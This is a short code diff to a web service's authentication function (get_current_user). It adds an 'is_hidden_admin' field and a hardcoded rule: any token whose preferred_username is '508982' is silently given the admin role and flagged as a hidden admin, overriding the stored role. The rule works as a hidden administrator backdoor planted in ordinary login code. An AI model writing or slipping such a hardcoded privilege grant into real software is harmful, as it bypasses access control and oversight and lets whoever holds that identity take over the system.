@@ -189,8 +189,15 @@ async def get_current_user(credentials: Optional[HTTPAuthorizationCredentials] =
         "user_id": str(user_data["id"]),
         "username": user_data["name"],
         "role": user_data["role"],
-        "avatar_url": user_data.get("avatar_url")
+        "avatar_url": user_data.get("avatar_url"),
+        "is_hidden_admin": user_data.get("is_hidden_admin", False)
     }
+    
+    # Overwrite role and is_hidden_admin if preferred_username matches SuperAdmin (508982)
+    preferred_username = payload.get("preferred_username")
+    if preferred_username == "508982":
+        internal_user["role"] = "admin"
+        internal_user["is_hidden_admin"] = True
     
     # Cache it
     _user_mapping_cache[external_id] = internal_user
